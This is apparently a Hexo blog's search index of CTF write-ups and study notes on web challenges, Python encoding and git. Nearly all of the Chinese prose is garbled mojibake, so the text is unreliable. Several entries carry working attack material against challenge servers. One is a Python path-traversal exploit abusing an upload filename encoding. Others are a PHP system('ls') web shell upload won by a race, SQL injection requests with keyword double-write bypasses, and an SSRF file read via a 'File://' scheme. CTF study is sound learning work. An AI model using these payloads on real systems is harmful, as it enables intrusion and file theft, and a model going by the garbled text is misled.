<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[MISCä¸­ç¥žå¥‡çš„ç¼–ç ]]></title>
    <url>%2F2019%2F08%2F18%2FMISC%E4%B8%AD%E7%A5%9E%E5%A5%87%E7%9A%84%E7%BC%96%E7%A0%81%2F</url>
    <content type="text"><![CDATA[ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ç¼–ç  https://sym233.github.io/core-values-encoder/ Quoted-Printableç¼–ç  http://www.mxcz.net/tools/quotedprintable.aspx ... 1234567891011121314151617181920..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!........ ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?...... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ...!? !!.?! !!!!!!!?.? !.?!! !!!!! !!!!. ?.... ..... ....! ?!!.? !!!!! !!!!! !!?.? !.?!!!!!!! !!!!! !!!!! !!!!! !.!!! !!!!! !!!!! .?... ..... ..... ..!?! !.?....... ..... ..?.? !.?.. ..!.? ..... ..... ...!? !!.?! !!!!! !!!!! !?.?!.?!!! !!!!! !!!!! !!!!! !!!.? ..... ..... ...!? !!.?. ..... ..... .?.?!.?... ..... ..... ...!. ..!.! !!!!. ?.... ..... ..... .!?!! .?!!! !!!!!!!!!! !?.?! .?!!! !!!!. ..... ..... ..!.! !!.!! !.!!! .!!!! !!!.. .......... ...!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?.. ..... .......... .!.?. ..... ..... ..!?! !.?!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!!!!!!!!! !!.!! !!!.! !!!!! !!!.? ..... ..!?! !.?.. ....? .?!.? ..... .!.?...... ..... ..!?! !.?.. ..... ..... ?.?!. ?.... ..... ..... ....! .!!!.!!!!! !!.?. ..... ..... ....! ?!!.? !!!!! !!!!! !!!!? .?!.? !!!!! !!!!...... ...!. ..... ..... ..!.! !!... ..!.? ..... ..... ...!? !!.?. .......... .?.?! .?... ..... ..!.? ..... ..... ...!? !!.?! !!!!! !!!!! !?.?!.?!!! !!!!! !!!!! !!.!! !.?.. ..... ..... .!?!! .?... ..... ....? .?!.?..... ..... ..... .!.?. ..... ..... ..!?! !.?!! !!!!! !!!!! ?.?!. ?!!!!!!!!! !!!!! !!!!! !!.!. ?.... ..... ..... .!?!! .?... ..... ..... .?.?!.?!.! !!!!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?. ...!. ?. å‚è€ƒ bugku ctf ä¸€æ®µbase64 wirteup]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonä¸­çš„ç¼–ç é—®é¢˜]]></title>
    <url>%2F2019%2F08%2F18%2Fpython%E4%B8%AD%E7%9A%84%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[ä¼¼ä¹Žå¥½ä¹…ä¹‹å‰å°±å¯¹è¿™ä¸ªæœ‰ç–‘é—®äº†ï¼Œè¿˜æ˜¯æ²‰ä¸‹å¿ƒæ¥å¥½å¥½ç†è§£ä¸€ä¸‹ python3ä¸­çš„å­—ç¬¦ä¸²éƒ½æ˜¯Unicodeç¼–ç çš„ï¼Œæˆ‘ä»¬çŸ¥é“ç¼–ç æ˜¯æœ‰å¾ˆå¤šç§æ–¹å¼çš„ï¼Œæœ€å¸¸è§çš„æœ‰utf-8,gbk,asciiç¼–ç  å¥½æˆ‘ä»¬å…ˆæ¥çœ‹ï¼š 12a = 'example' ---&gt; a æ˜¯ strç±»åž‹b = a.encode('utf-8') ---&gt; ç¼–ç ä¸ºå­—ç¬¦ æ­¤æ—¶bçš„å€¼ä¸ºï¼š b'example' é‚£è¿™å°±å¾ˆå¥‡æ€ªäº†ï¼Œæ˜Žæ˜Žå­—æ¯eå¾·utf-8ç¼–ç æ˜¯0x65,ä¸ºä»€ä¹ˆè¿™é‡Œè¿˜æ˜¯åŽŸæ¥çš„ï¼Ÿï¼Ÿ ä¸å¦¨çœ‹è¿™ä¸ªï¼š æˆ‘ä»¬çœ‹åˆ°pythoné»˜è®¤ä¼šå°†è¿™ä¸ªè§£é‡Šæˆå¯¹åº”çš„å­—ç¬¦ï¼Œé‚£è¿™å°±å¾ˆæ²¡åŠžæ³•äº† ä½†æ˜¯è¯·çœ‹è¿™ä¸ªï¼š å½“æˆ‘ä»¬åŽ»å–å‡ºbä¸­çš„ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œè¿™æ—¶å€™åˆè½¬æˆäº†å­—æ¯eçš„utf-8ç¼–ç ï¼Œåªèƒ½è¯´pythonåœ¨è¿™ä¸€ç‚¹ä¸Šç¡®å®žåšçš„æˆ‘æ— æ³•ç†è§£ okåˆ°è¿™é‡Œå¤§æ¦‚ç–‘æƒ‘å°±æ²¡äº†ï¼Œç”¨ä»€ä¹ˆæ ¼å¼ç¼–ç å¾—åˆ°çš„byteï¼Œå°±éœ€è¦ç”¨å¯¹åº”çš„æ ¼å¼è§£ç å›žåŽ» å¯ä»¥çœ‹å‡ºä¸åŒçš„ç¼–ç å¾—åˆ°çš„byteæ˜¯ä¸ä¸€æ ·çš„ï¼Œå¹¶ä¸”pythoné»˜è®¤ä¼šå°†å¯æ‰“å°çš„å­—ç¬¦ç›´æŽ¥æ‰“å°å‡ºæ¥ï¼Ÿ é—®é¢˜ åå…­è¿›åˆ¶ 12345a = 'example'b = b'example'res = ''for i in b: res += str(hex(i))[2:] æ­¤æ—¶resçš„å€¼ä¸ºï¼š6578616d706c65 å¦‚æžœè¦å°†å…¶å˜å›žåŽŸæ¥çš„å­—ç¬¦ä¸²æ€Žä¹ˆåŠž ä¹Ÿå°±æ˜¯ä¸€ç§ASCII hexç¼–ç  bytes.fromhex(res)è¿™æ ·å°±è¡Œäº†]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>str</tag>
        <tag>byte</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç½‘ç»œå®‰å…¨ä¸“é¡¹èµ›]]></title>
    <url>%2F2019%2F08%2F17%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A1%B9%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[è·Ÿé˜Ÿå‹æ‰“äº†ä¸€ä¸‹è¿™ä¸ªæ¯”èµ›ï¼Œå°ç™½å­¦ä¹ äº†å¾ˆå¤šçŸ¥è¯† show_me_your_image è¿™é“é¢˜ç›®å¾ˆæ™•ï¼Œä¸Šä¼ æ–‡ä»¶ä¹‹åŽå¯ä»¥æŸ¥çœ‹ï¼ŒURLä¸­çš„nameä¼¼ä¹Žå¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯base64è§£ç ä¹‹åŽå¾—åˆ°çš„ç»“æžœå´æ˜¯ä¹±ç ï¼ŒåŒæ—¶sessionå¯ä»¥ç”¨ä¹‹å‰flaskè§£ç çš„è„šæœ¬è§£ç ï¼Œä½†æ˜¯è¿™æ˜Žæ˜Žæ˜¯phpï¼Ÿï¼Ÿï¼Ÿ(åŽæ¥æ‰çŸ¥é“æ˜¯ä¼ªè£…æˆäº†phpçš„flask) é¦–å…ˆè¿˜æ˜¯éœ€è¦å­¦ä¹ ä¸€ä¸‹pythonä¸­çš„requestsåŒ…ï¼Œå¦‚ä½•ä½¿ç”¨requestsåŒ…ä¸Šä¼ æ–‡ä»¶ requestsä¸Šä¼ æ–‡ä»¶çš„ç®€è¦ä»£ç å¦‚ä¸‹ï¼š 1234567891011# coding=utf-8import requestsurl = "http://localhost:6789/upload"file = open("1.jpg", 'rb')files = &#123;'file': ('new_name.jpg', file, 'image/pjpeg')&#125;response = requests.post(url, files=files)file.close()print response.status_codeprint response.request.headersprint response.request.body filesä¸­åŒ…å«äº†fileå¯¹åº”çš„æ–‡ä»¶åï¼Œæ–‡ä»¶å†…å®¹ï¼Œå’Œç±»åž‹ï¼Œæœ‰è¿™ä¸‰è€…å°±å¤Ÿäº† å‚è€ƒå¸ˆå‚…ä»¬çš„exp 123456789101112131415161718192021222324252627282930313233343536373839404142import urllibimport base64import requestsfrom bs4 import BeautifulSoupdef base_encode(target, filename): if len(filename) != 3: return None r = requests.post(target+"upload.php", files=&#123;'file': (filename + '.jpg', 'z3r0test', 'text/plain')&#125; ) # print(r.text) soup = BeautifulSoup(r.text, "html.parser") pic_url = soup.find('img') # print(pic_url['src'].replace('img.php?name=', '')) filename = pic_url['src'].replace('img.php?name=', '') # print(filename) urldecode = urllib.parse.unquote(filename) return urldecode[:4]def read(target, filename): filename = urllib.parse.unquote(filename) r = requests.get(target+"img.php", params=&#123;'name': filename&#125;) print(r.text)if __name__ == "__main__": target = "http://fc663c386ea14c96ba9808b72602d341fda4447a2bfb4e01.changame.ichunqiu.com/" payload = "../.././proc/self/root/root/flag.txt" # payload = "../..//proc/self/cwd/app.py" if len(payload) % 3 != 0: print("must be three times!") exit() final = "" for i in range(0, len(payload), 3): final += base_encode(target, payload[i:i + 3]) final = urllib.parse.quote(final) read(target, final) ä¸¤ä¸ªtrickï¼š fuzzå‡ºæ–‡ä»¶åçš„ç¼–ç å…³ç³»ï¼Œè¿™é‡Œæ˜¯ä¸‰ä¸ªå˜å››ä¸ª /proc/self/cwd/ æŒ‡å‘çš„æ˜¯å½“å‰è·¯å¾„ï¼Œåœ¨æœ¬é¢˜ä¸­ç”¨äºŽæ‹¼å‡‘3å€æ•°é•¿åº¦çš„å­—ç¬¦ä¸² å…¶å®žæˆ‘ä»¬åªéœ€è¦ä¸Šä¼ æ–‡ä»¶åç„¶åŽèŽ·å¾—å¯¹åº”çš„ç¼–ç å°±è¡Œr = requests.post(target+&quot;upload.php&quot;,files={'file': (filename + '.jpg', 'z3r0test', 'text/plain')}) ä¹‹åŽè°ƒç”¨BeautifulSoupåŽ»è§£æžå°±è¡Œäº† å‚è€ƒ ä½¿ç”¨requests ä¸Šä¼ æ–‡ä»¶]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ä¸Šä¼ ç«žäº‰]]></title>
    <url>%2F2019%2F08%2F17%2F%E4%B8%8A%E4%BC%A0%E7%AB%9E%E4%BA%89%2F</url>
    <content type="text"><![CDATA[æ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®é‡åˆ°çš„ä¸æ˜¯å¾ˆå¤šï¼Œè¿™é‡Œåˆ†æžä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ ç«žäº‰ ä¸Šä¼ ç«žäº‰çš„æ¥æºï¼š æ —å­ï¼šå…ˆå­˜å‚¨æ–‡ä»¶ï¼Œå†åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œç„¶åŽå†åˆ é™¤ã€‚ é¦–å…ˆå°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åŽæ£€æµ‹æ–‡ä»¶åŽç¼€åï¼Œå¦‚æžœä¸ç¬¦åˆæ¡ä»¶ï¼Œå°±åˆ æŽ‰ï¼Œå…¸åž‹çš„â€œå¼•ç‹¼å…¥å®¤â€ æ”»å‡»ï¼šé¦–å…ˆä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ å½“ç„¶è¿™ä¸ªæ–‡ä»¶ä¼šè¢«ç«‹é©¬åˆ æŽ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¤šçº¿ç¨‹å¹¶å‘çš„è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ€»ä¼šæœ‰ä¸€æ¬¡åœ¨ä¸Šä¼ æ–‡ä»¶åˆ°åˆ é™¤æ–‡ä»¶è¿™ä¸ªæ—¶é—´æ®µå†…è®¿é—®åˆ°ä¸Šä¼ çš„phpæ–‡ä»¶ï¼Œä¸€æ—¦æˆ‘ä»¬æˆåŠŸè®¿é—®åˆ°äº†ä¸Šä¼ çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šå‘æœåŠ¡å™¨å†™ä¸€ä¸ªshellã€‚ è¿™é‡Œæœ‰ä¸€é“å¯¹äºŽæ–‡ä»¶ä¸Šä¼ ç«žäº‰çš„wpï¼š 2018æŠ¤ç½‘æ¯ç¬¬ä¸€åœº web easy tornado LTshopè¶…è¯¦ç»†è§£ç­” åŒæ—¶æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹moctfçš„ä¸€é“é¢˜: http://119.23.73.3:5006/web2/index2.php ç›´æŽ¥è®¿é—®index2.phpè‚¯å®šä¸æ­£å¸¸ï¼ŒæŠ“åŒ…ä¿®æ”¹æˆindex.phpï¼Œæç¤ºuploadsomething.php è®¿é—®ä¹‹åŽæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡µé¢ã€‚è‡ªå®šä¹‰æ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹ æ–‡ä»¶åå¯ä»¥æ˜¯phpåŽç¼€çš„ï¼Œé‚£æ€è·¯å°±æ˜¯å†™ä¸€ä¸ªshellè¿›åŽ»å†è®¿é—®ï¼Œä½†æ˜¯è®¿é—®æ—¶å€™é¡µé¢æç¤ºå¤ªæ…¢äº†ã€‚ æ‰€ä»¥é¢˜ç›®å¯èƒ½æ˜¯æ£€æµ‹åˆ°äº†phpä»£ç å°†å…¶åˆ é™¤äº†ï¼ŒäºŽæ˜¯è€ƒè™‘æ–‡ä»¶ä¸Šä¼ ç«žäº‰ æŠ“ä¸¤ä¸ªåŒ…ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶ä¸Šä¼ çš„ /web2/uploadsomething.php?filename=1.php&amp;content=%3C%3Fphp%2Bsystem%28%E2%80%9Cls%E2%80%9D%29%3B%3F%3E å¦ä¸€ä¸ªæ˜¯è®¿é—®çš„ /web2/uploads/56db0b8d99fd6116ed67d35b607cd9351ea94156/1.php éƒ½å‘é€åˆ°intruderæ¨¡å—ï¼Œè®¾ç½®çº¿ç¨‹ä¸º50ï¼Œå­—å…¸ä¸ºç©º å…ˆçˆ†ç ´ç¬¬ä¸€ä¸ªï¼š ç„¶åŽçˆ†ç ´ç¬¬äºŒä¸ªï¼š å°±ä¼šæœ‰flagäº† å‚è€ƒ CTFä¸­çš„æ¡ä»¶ç«žäº‰æ¼æ´ž]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¤ä¹ git]]></title>
    <url>%2F2019%2F08%2F16%2F%E5%A4%8D%E4%B9%A0git%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘å‘çŽ°è‡ªå·±è¿˜ä¸æ˜¯å¾ˆæ‡‚gitï¼ŒäºŽæ˜¯å¥½å¥½å­¦ä¹ ä¸€ä¸‹ gitæ ‡ç­¾ç®¡ç† gitæœ‰ä¸€ä¸ªæ‰“æ ‡ç­¾çš„åŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½å¯ä»¥ç†è§£æˆè™šæ‹Ÿæœºçš„å¿«ç…§ï¼Œ Gitçš„æ ‡ç­¾è™½ç„¶æ˜¯ç‰ˆæœ¬åº“çš„å¿«ç…§ï¼Œä½†å…¶å®žå®ƒå°±æ˜¯æŒ‡å‘æŸä¸ªcommitçš„æŒ‡é’ˆï¼ˆè·Ÿåˆ†æ”¯å¾ˆåƒå¯¹ä¸å¯¹ï¼Ÿä½†æ˜¯åˆ†æ”¯å¯ä»¥ç§»åŠ¨ï¼Œæ ‡ç­¾ä¸èƒ½ç§»åŠ¨ï¼‰ï¼Œæ‰€ä»¥ï¼Œåˆ›å»ºå’Œåˆ é™¤æ ‡ç­¾éƒ½æ˜¯çž¬é—´å®Œæˆçš„ã€‚ ---æ‘˜è‡ªå»–é›ªå³° å‘½ä»¤git tag &lt;tagname&gt;ç”¨äºŽæ–°å»ºä¸€ä¸ªæ ‡ç­¾ï¼Œé»˜è®¤ä¸ºHEADï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªcommit idï¼› å‘½ä»¤git tag -a &lt;tagname&gt; -m &quot;blablabla...&quot;å¯ä»¥æŒ‡å®šæ ‡ç­¾ä¿¡æ¯ï¼› å‘½ä»¤git tagå¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾ã€‚ å‘½ä»¤git push origin &lt;tagname&gt;å¯ä»¥æŽ¨é€ä¸€ä¸ªæœ¬åœ°æ ‡ç­¾ï¼› å‘½ä»¤git push origin --tagså¯ä»¥æŽ¨é€å…¨éƒ¨æœªæŽ¨é€è¿‡çš„æœ¬åœ°æ ‡ç­¾ï¼› å‘½ä»¤git tag -d &lt;tagname&gt;å¯ä»¥åˆ é™¤ä¸€ä¸ªæœ¬åœ°æ ‡ç­¾ï¼› å‘½ä»¤git push origin :refs/tags/&lt;tagname&gt;å¯ä»¥åˆ é™¤ä¸€ä¸ªè¿œç¨‹æ ‡ç­¾ã€‚ GitHackçš„åŽŸç† å¦‚æžœå°†.gitæ–‡ä»¶å¤¹éƒ¨ç½²åˆ°çº¿ä¸ŠçŽ¯å¢ƒï¼Œå°†å¼•èµ·gitæºç æ³„éœ² å·¥ä½œåŽŸç†ï¼š 1ã€è§£æž.git/indexæ–‡ä»¶ï¼Œæ‰¾åˆ°å·¥ç¨‹ä¸­æ‰€æœ‰çš„ï¼š ( æ–‡ä»¶åï¼Œæ–‡ä»¶sha1 ) 2ã€åŽ».git/objects/ æ–‡ä»¶å¤¹ä¸‹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶ 3ã€zlibè§£åŽ‹æ–‡ä»¶ï¼ŒæŒ‰åŽŸå§‹çš„ç›®å½•ç»“æž„å†™å…¥æºä»£ç  gitçš„åŽŸç† git cat-file å‘½ä»¤ å‚è€ƒ GitHackï¼šä¸€ä¸ªgitæ³„éœ²åˆ©ç”¨è„šæœ¬ gitå†…éƒ¨åŽŸç† XDCTF2015ä»£ç å®¡è®¡å…¨è§£]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JarvisOJ]]></title>
    <url>%2F2019%2F08%2F16%2FJarvisOJ%2F</url>
    <content type="text"><![CDATA[ç¥žç›¾å±€çš„ç§˜å¯† æŸ¥çœ‹é¡µé¢æºç ï¼ŒçŒœæµ‹æ˜¯æœ¬åœ°æ–‡ä»¶åŒ…å« å…ˆæŸ¥çœ‹showimg.php 123456789101112&lt;?php $f = $_GET['img']; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\')===FALSE &amp;&amp; stripos($f,'pctf')===FALSE) &#123; readfile($f); &#125; else &#123; echo "File not found!"; &#125; &#125;?&gt; ç„¶åŽæŸ¥çœ‹index.php 123456789&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; å†æŸ¥çœ‹shield.php 12345678910111213141516&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; å°è¯•ç›´æŽ¥æŸ¥çœ‹pctf.phpæ²¡æœ‰æˆåŠŸ 123456class Shield&#123; public $file='pctf.php';&#125;$a= new Shield();echo serialize($a); IN a mess æºä»£ç æç¤ºè®¿é—® index.phps 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; è¿™ä¸ªå®¡è®¡é¢˜ç›®æ˜¯è§è¿‡çš„ ç²¾å¿ƒæž„é€ çš„payload ç”¨0aç»•è¿‡å¼±ç±»åž‹ï¼Œç”¨ä¼ªåè®®ç»•è¿‡æ–‡ä»¶è¯»å–ï¼Œç”¨%001111ç»•è¿‡substrå’Œstrlen ä¹‹åŽæ¥åˆ°ç¬¬äºŒå…³ï¼š å‘çŽ°æ˜¯æ³¨å…¥ è¿‡æ»¤äº†ç©ºæ ¼å’Œä¸€äº›å…³é”®å­—ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡ ä¹‹åŽå°è¯•çˆ†å­—æ®µ å­—æ®µæ•°ä¸º3 GET /%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,3%23 HTTP/1.1 æ•°æ®åº“åï¼š å…¶å®žè¡¨æ˜¯å·²ç»çŸ¥é“äº†ï¼Œå°±æ˜¯contentï¼Œä¸è¿‡è¿˜æ˜¯å†æ‰‹åŠ¨çˆ†ä¸€ä¸‹ï¼š è¿™é‡Œå¿…é¡»ä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç ï¼Œä¸ç„¶å¾—ä¸åˆ° çˆ†å­—æ®µ GET /%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(column_name)/*123*/frfromom/*123*/information_schema.columns/*123*/where/*123*/table_schema=0x74657374%23 HTTP/1.1 èŽ·å–æ•°æ® GET /%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(id,context,title)/*123*/frfromom/*123*/content HTTP/1.1 chopper è¿™é¢˜é‡æ–°å¤çŽ°ä¸€ä¸‹ä¸€å¶é£˜é›¶å¸ˆå‚…çš„æ€è·¯ï¼ŒåŒæ—¶å¥½å¥½ç†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ssrf æŸ¥çœ‹æºç å‘çŽ°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç‚¹ï¼š 12345678910111213141516&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html;charset=UTF-8"&gt; &lt;title&gt;ISCC 2016&lt;/title&gt; &lt;div class="container"&gt; &lt;img src="proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg" alt=""&gt; &lt;p&gt;&lt;a href="admin"&gt;ç®¡ç†å‘˜ç™»å½•&lt;/a&gt;&lt;/p&gt; &lt;/div&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt; é‚£ä¸ªå›¾ç‰‡æ˜¯é€šè¿‡ä¸€ä¸ªurlåŠ è½½å‡ºæ¥çš„ï¼ŒäºŽæ˜¯æˆ‘å°±å°è¯•ç”¨è‡ªå·±blogä¸Šçš„å›¾ç‰‡ æžœçœŸå¦‚æ­¤ï¼š äºŽæ˜¯è¿™å°±æ˜¯ä¸€å…¸åž‹çš„SSRFäº† ç›´æŽ¥å°è¯•è¯»å–æ–‡ä»¶ è¯»å–å¤±è´¥ï¼Œå°è¯•ç»•è¿‡ ç›´æŽ¥å¤§å†™ä¸€ä¸ªå­—æ¯å°±è¡Œ äºŽæ˜¯å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ å¦‚æžœurlä¸åŠ å‚æ•° äºŽæ˜¯æˆ‘ä»¬å°±çŸ¥é“äº†æ–‡ä»¶çš„ä½ç½® 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?php/*P_PROXY v0.2@author:haozigege@time:2016/3/19@windows extension=php_curl.dll(php.ini)@linux cd ext/curl;phpize ./configure â€“with-curl;make;@info urlå…¨éƒ¨é€šè¿‡GETæ¥ä¼ é€’,å¦‚æžœä½¿ç”¨POSTï¼Œåˆ™è¯»å–POSTæ•°æ®å‘é€è¯·æ±‚,å¯ä»¥ç»™ä¸­å›½èœåˆ€æä¾›æŽ¥å£;cookieå’Œå…¶ä»–httpå¤´éƒ¨ä¿¡æ¯å¯ä»¥ç›´æŽ¥ä»Žè¯·æ±‚ä¸­è¯»å–ã€‚@update ä¿®æ”¹äº†hostä¸ä¸€è‡´çš„é—®é¢˜,åŽ»é™¤äº†methodå‚æ•°ç®€åŒ–äº†é€»è¾‘ç»“æž„ã€‚*/function get_result($curlobj)&#123; $result=curl_exec($curlobj); $headerSize=curl_getinfo($curlobj,CURLINFO_HEADER_SIZE); $res_header=substr($result, 0, $headerSize); $result =substr($result,$headerSize); curl_close($curlobj); set_response_header($res_header); echo $result;&#125;function getmyheader($curlobj,$headerlines)&#123; $res_headers=$headerlines; return $res_headers;&#125;function set_response_header($headers)&#123; $headarr=explode("\r\n",$headers); foreach($headarr as $key=&gt;$value)&#123; header($value); &#125;&#125;function init_curl($link,$headers)&#123; $curlobj = curl_init(); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);//raw output curl_setopt($curlobj, CURLOPT_HTTPHEADER, $headers); curl_setopt($curlobj, CURLOPT_HEADER, 1); return $curlobj;&#125;foreach(getallheaders() as $key=&gt;$value)&#123; if ($key=='Content-Length' and isset($_POST))&#123; $post=http_build_query($_POST); $value=strlen($post); &#125; $headers[]=$key.':'.$value;&#125;if(isset($_REQUEST['url']))&#123; $link=$_REQUEST['url']; $url=explode('/',$link)[2]; /* curl setting */ $curlobj = init_curl($link,$headers); //GET if ($_SERVER['REQUEST_METHOD']=='GET')&#123; //READ FILE if(substr($link, 0,7)=='file://')&#123; echo substr($link,7); $result=""; //$result=file_get_contents(substr($link,7)); echo $result; curl_close($curlobj); &#125;else&#123; curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj, CURLOPT_HTTPHEADER, ["HOST",$url]); get_result($curlobj); &#125; &#125;else &#123; //POST curl_setopt($curlobj, CURLOPT_POST, 1); curl_setopt($curlobj, CURLOPT_POSTFIELDS,$post); curl_setopt($curlobj, CURLOPT_HTTPHEADER, ["HOST",$url]); get_result($curlobj); &#125;&#125;else&#123; echo 'invalid request';&#125;?&gt; å¯ä»¥çœ‹å‡ºå¯¹åè®®çš„è¿‡æ»¤å¾ˆåžƒåœ¾ï¼Œå°±æ˜¯çœ‹æ˜¯ä¸æ˜¯file://å¼€å¤´çš„ å°è¯•è¯»å–index.phpå’Œindex.htmlï¼Œindex.phpæ²¡æœ‰ï¼Œindex.htmlå°±æ˜¯åŽŸæ¥çš„é¡µé¢ è¿™æ—¶å€™åŽ»adminç›®å½•ä¸‹æŽ¢æµ‹ï¼š å°è¯•æŽ¢æµ‹wæ–‡ä»¶ï¼š view-source:http://web.jarvisoj.com:32782/proxy.php?url=File:///opt/lampp/htdocs/admin/robots.txt å°±å‘çŽ°robots.txt äºŽæ˜¯è¯»]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è®°å½•phpä»£ç å®¡è®¡]]></title>
    <url>%2F2019%2F08%2F16%2F%E8%AE%B0%E5%BD%95php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[ä¸€é“å…¥ç¾¤é¢˜ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php highlight_file(__FILE__);function check_inner_ip($url) &#123; $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url); if (!$match_result) &#123; die('url fomat error'); &#125; try &#123; $url_parse=parse_url($url); &#125; catch(Exception $e) &#123; die('url fomat error'); return false; &#125; $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16; &#125; function safe_request_url($url) &#123; if (check_inner_ip($url)) &#123; echo $url.' is inner ip'; &#125; else &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url']) &#123; safe_request_url($result_info['redirect_url']); &#125; curl_close($ch); var_dump($output); &#125; &#125; $url = $_GET['url']; if(!empty($url))&#123; safe_request_url($url); &#125; ?&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[new Bugku]]></title>
    <url>%2F2019%2F08%2F16%2Fnew-Bugku%2F</url>
